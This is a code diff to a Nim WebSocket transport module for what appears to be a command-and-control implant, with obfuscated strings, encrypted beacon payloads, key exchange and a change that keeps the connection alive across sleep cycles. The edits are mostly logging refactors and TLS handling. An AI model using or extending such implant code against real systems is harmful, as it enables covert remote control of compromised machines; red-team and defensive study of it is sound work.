@@ -33,17 +33,21 @@ proc buildWebSocketUrl(profile: WebSocketProfile): string =
   if endpoint.len == 0:
     raise newException(ValueError, obf("ENDPOINT_REPLACE environment variable is not set"))
   
-  # Strip any existing scheme from host
-  if host.startsWith("wss://") or host.startsWith("ws://"):
-    let protocolEnd = if host.startsWith("wss://") : 6 else: 5
-    host = host[protocolEnd..^1]
+  # Strip any existing scheme from host and determine TLS from it
+  var useTls = false
+  if host.startsWith("wss://"):
+    useTls = true
+    host = host[6..^1]
+  elif host.startsWith("ws://"):
+    host = host[5..^1]
   elif host.startsWith("https://"):
+    useTls = true
     host = host[8..^1]
   elif host.startsWith("http://"):
     host = host[7..^1]
   
-  # Determine protocol based on port
-  let protocol = if port == "443": "wss" else: "ws"
+  # Use TLS if scheme indicated it, or fall back to port-based detection
+  let protocol = if useTls or port == "443": "wss" else: "ws"
   
   # Build URL
   result = protocol & "://" & host & ":" & port & "/" & endpoint.strip(chars = {'/'})
@@ -54,17 +58,17 @@ proc ensureConnection(profile: var WebSocketProfile): bool =
     return true
   
   try:
-    debug "[DEBUG] Connecting to WebSocket: ", profile.url
+    debugLog "websocket", "Connecting to WebSocket: ", profile.url
     # Note: ws library doesn't support custom headers in simple newWebSocket()
     # Would require using Request object for custom headers
-    debug "[DEBUG] WebSocket User-Agent: ", profile.config.userAgent, " (not configurable with ws library)"
+    debugLog "websocket", "WebSocket User-Agent: ", profile.config.userAgent, " (not configurable with ws library)"
     # Use waitFor() to block on async connection
     profile.ws = waitFor(newWebSocket(profile.url))
     profile.connected = true
-    debug "[DEBUG] WebSocket connected successfully"
+    debugLog "websocket", "WebSocket connected successfully"
     return true
   except:
-    debug "[DEBUG] WebSocket connection failed: ", getCurrentExceptionMsg()
+    debugLog "websocket", "WebSocket connection failed: ", getCurrentExceptionMsg()
     profile.connected = false
     return false
 
@@ -79,83 +83,83 @@ proc send*(profile: var WebSocketProfile, data: string, callbackUuid: string = "
   ## Send data to C2 server via WebSocket using blocking waitFor()
   let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid
   
-  debug "[DEBUG] === SENDING DATA VIA WEBSOCKET ==="
+  debugLog "websocket", "=== SENDING DATA VIA WEBSOCKET ==="
   # Try to pretty-print JSON if it's valid JSON and small enough
   try:
     let jsonData = parseJson(data)
     # Only show full JSON for small payloads (< 2KB)
     if data.len < 2048:
-      debug "[DEBUG] Request JSON:"
+      debugLog "websocket", "Request JSON:"
       debug jsonData.pretty()
     else:
       # For large payloads, show summary
-      debug "[DEBUG] Request: Large payload (", data.len, " bytes)"
+      debugLog "websocket", "Request: Large payload (", data.len, " bytes)"
       if jsonData.hasKey(obf("action")):
-        debug "[DEBUG] Action: ", jsonData["action"].getStr()
+        debugLog "websocket", "Action: ", jsonData["action"].getStr()
       if jsonData.hasKey(obf("responses")):
-        debug "[DEBUG] Responses count: ", jsonData["responses"].len
+        debugLog "websocket", "Responses count: ", jsonData["responses"].len
   except:
     # Not JSON or parse error, show raw
-    debug "[DEBUG] Request data (first 500 chars): ", data[0..<min(500, data.len)]
+    debugLog "websocket", "Request data (first 500 chars): ", data[0..<min(500, data.len)]
   
   # Ensure connection
   if not profile.ensureConnection():
-    debug "[DEBUG] Failed to establish WebSocket connection"
+    debugLog "websocket", "Failed to establish WebSocket connection"
     return ""
   
   try:
     # Only encrypt if AES key is available AND we have a callback UUID
     var payload: string
     if profile.aesKey.len > 0 and callbackUuid.len > 0:
-      debug "[DEBUG] Encrypting payload with AES-256-CBC+HMAC"
-      debug "[DEBUG] Data length: ", data.len, " bytes"
-      debug "[DEBUG] AES key length: ", profile.aesKey.len, " bytes"
-      debug "[DEBUG] UUID: ", uuid
+      debugLog "websocket", "Encrypting payload with AES-256-CBC+HMAC"
+      debugLog "websocket", "Data length: ", data.len, " bytes"
+      debugLog "websocket", "AES key length: ", profile.aesKey.len, " bytes"
+      debugLog "websocket", "UUID: ", uuid
       payload = encryptPayload(data, profile.aesKey, uuid)
-      debug "[DEBUG] Encrypted payload length: ", payload.len, " bytes"
+      debugLog "websocket", "Encrypted payload length: ", payload.len, " bytes"
     else:
       # No encryption, just base64(UUID + data)
-      debug "[DEBUG] Sending unencrypted payload (Base64 only)"
-      debug "[DEBUG] Data length: ", data.len, " bytes"
-      debug "[DEBUG] UUID: ", uuid
+      debugLog "websocket", "Sending unencrypted payload (Base64 only)"
+      debugLog "websocket", "Data length: ", data.len, " bytes"
+      debugLog "websocket", "UUID: ", uuid
       payload = encode(uuid & data)
-      debug "[DEBUG] Encoded payload length: ", payload.len, " bytes"
+      debugLog "websocket", "Encoded payload length: ", payload.len, " bytes"
     # Create WebSocket message JSON
     let wsMsg = WebSocketMessage(data: payload)
     let jsonStr = $(%*wsMsg)
-    debug "[DEBUG] Sending WebSocket frame to: ", profile.url
-    debug "[DEBUG] Frame JSON length: ", jsonStr.len, " bytes"
+    debugLog "websocket", "Sending WebSocket frame to: ", profile.url
+    debugLog "websocket", "Frame JSON length: ", jsonStr.len, " bytes"
     if jsonStr.len < 500:
-      debug "[DEBUG] Full frame JSON: ", jsonStr
+      debugLog "websocket", "Full frame JSON: ", jsonStr
     else:
-      debug "[DEBUG] Payload preview (first 100 chars): ", payload[0..<min(100, payload.len)]
+      debugLog "websocket", "Payload preview (first 100 chars): ", payload[0..<min(100, payload.len)]
     # Send using blocking waitFor()
-    debug "[DEBUG] Sending WebSocket message..."
+    debugLog "websocket", "Sending WebSocket message..."
     waitFor(profile.ws.send(jsonStr))
-    debug "[DEBUG] Waiting for response..."
+    debugLog "websocket", "Waiting for response..."
     # Receive response using blocking waitFor()
     let frameData = waitFor(profile.ws.receiveStrPacket())
-    debug "[DEBUG] WebSocket response received"
-    debug "[DEBUG] Frame data length: ", frameData.len, " bytes"
-    debug "[DEBUG] Raw frame data: ", frameData
+    debugLog "websocket", "WebSocket response received"
+    debugLog "websocket", "Frame data length: ", frameData.len, " bytes"
+    debugLog "websocket", "Raw frame data: ", frameData
     # Parse JSON response wrapper
     try:
       let frameJson = parseJson(frameData)
       if frameJson.hasKey(obf("data")):
         let respData = frameJson[obf("data")].getStr()
-        debug "[DEBUG] Response data length: ", respData.len, " bytes"
+        debugLog "websocket", "Response data length: ", respData.len, " bytes"
         if respData.len > 0:
-          debug "[DEBUG] Response preview (first 100 chars): ", respData[0..<min(100, respData.len)]
+          debugLog "websocket", "Response preview (first 100 chars): ", respData[0..<min(100, respData.len)]
         else:
-          debug "[DEBUG] Response data is EMPTY!"
+          debugLog "websocket", "Response data is EMPTY!"
         # Decrypt response if AES key is available and we have callback UUID
         if profile.aesKey.len > 0 and callbackUuid.len > 0:
-          debug "[DEBUG] Decrypting response with AES-256-CBC+HMAC"
+          debugLog "websocket", "Decrypting response with AES-256-CBC+HMAC"
           result = decryptPayload(respData, profile.aesKey)
-          debug "[DEBUG] Decrypted response length: ", result.len, " bytes"
+          debugLog "websocket", "Decrypted response length: ", result.len, " bytes"
         else:
           # No encryption, decode and skip UUID
-          debug "[DEBUG] Decoding unencrypted response (Base64)"
+          debugLog "websocket", "Decoding unencrypted response (Base64)"
           let decoded = decode(respData)
           if decoded.len > 36:
             result = decoded[36..^1]
@@ -163,33 +167,33 @@ proc send*(profile: var WebSocketProfile, data: string, callbackUuid: string = "
             result = ""
         # Try to parse and pretty-print response JSON
         if result.len > 0:
-          debug "[DEBUG] === RECEIVED RESPONSE ==="
+          debugLog "websocket", "=== RECEIVED RESPONSE ==="
           try:
             let jsonResp = parseJson(result)
             # Only show full JSON for small responses (< 2KB)
             if result.len < 2048:
-              debug "[DEBUG] Response JSON:"
+              debugLog "websocket", "Response JSON:"
               debug jsonResp.pretty()
             else:
               # For large responses, show summary
-              debug "[DEBUG] Response: Large payload (", result.len, " bytes)"
+              debugLog "websocket", "Response: Large payload (", result.len, " bytes)"
               if jsonResp.hasKey(obf("action")):
-                debug "[DEBUG] Action: ", jsonResp["action"].getStr()
+                debugLog "websocket", "Action: ", jsonResp["action"].getStr()
               if jsonResp.hasKey(obf("responses")):
-                debug "[DEBUG] Responses count: ", jsonResp["responses"].len
+                debugLog "websocket", "Responses count: ", jsonResp["responses"].len
               if jsonResp.hasKey(obf("tasks")):
-                debug "[DEBUG] Tasks count: ", jsonResp["tasks"].len
+                debugLog "websocket", "Tasks count: ", jsonResp["tasks"].len
           except:
-            debug "[DEBUG] Response data (first 500 chars): ", result[0..<min(500, result.len)]
+            debugLog "websocket", "Response data (first 500 chars): ", result[0..<min(500, result.len)]
         return result
       else:
-        debug "[DEBUG] No 'data' field in response JSON"
+        debugLog "websocket", "No 'data' field in response JSON"
         return ""
     except:
-      debug "[DEBUG] Failed to parse response JSON: ", getCurrentExceptionMsg()
+      debugLog "websocket", "Failed to parse response JSON: ", getCurrentExceptionMsg()
       return ""
   except:
-    debug "[DEBUG] WebSocket request failed: ", getCurrentExceptionMsg()
+    debugLog "websocket", "WebSocket request failed: ", getCurrentExceptionMsg()
     profile.connected = false
     try:
       profile.ws.close()
@@ -207,16 +211,13 @@ proc close*(profile: var WebSocketProfile) =
     profile.connected = false
 
 proc cleanup*(profile: var WebSocketProfile) =
-  ## Close WebSocket connection to avoid keeping ESTABLISHED connections during sleep
-  debug "[DEBUG] WebSocket Profile: Cleaning up connection"
-  profile.close()
-  debug "[DEBUG] WebSocket Profile: Connection closed"
+  ## No-op for WebSocket: keep the persistent connection alive across sleep cycles.
+  ## Reconnection on failure is handled automatically by ensureConnection() in sendMessage().
+  discard
 
 proc reconnect*(profile: var WebSocketProfile) =
-  ## Recreate WebSocket connection after cleanup
-  debug "[DEBUG] WebSocket Profile: Reconnecting"
-  discard profile.ensureConnection()
-  debug "[DEBUG] WebSocket Profile: Reconnection complete"
+  ## No-op: connection persists across sleep, no reconnect needed.
+  discard
 
 proc setAesKey*(profile: var WebSocketProfile, key: seq[byte]) =
   ## Set the AES encryption key
@@ -235,13 +236,13 @@ proc performKeyExchange*(profile: var WebSocketProfile): tuple[success: bool, ne
   
   # If no encrypted exchange needed, just use the static PSK
   if not profile.config.encryptedExchange:
-    debug "[DEBUG] No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
+    debugLog "websocket", "No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
     # Don't set key yet - will be set after successful checkin
     return (true, "")
   
   # Only compile RSA code if encrypted exchange is enabled at build time
   when not encryptedExchange:
-    debug "[DEBUG] RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
+    debugLog "websocket", "RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
     return (true, "")
   
   # Use shared key exchange implementation
@@ -261,5 +262,5 @@ proc performKeyExchange*(profile: var WebSocketProfile): tuple[success: bool, ne
       # No key exchange needed (AESPSK mode)
       return (true, "")
     else:
-      debug "[DEBUG] Key exchange failed: ", exchangeResult.error
+      debugLog "websocket", "Key exchange failed: ", exchangeResult.error
       return (false, "")
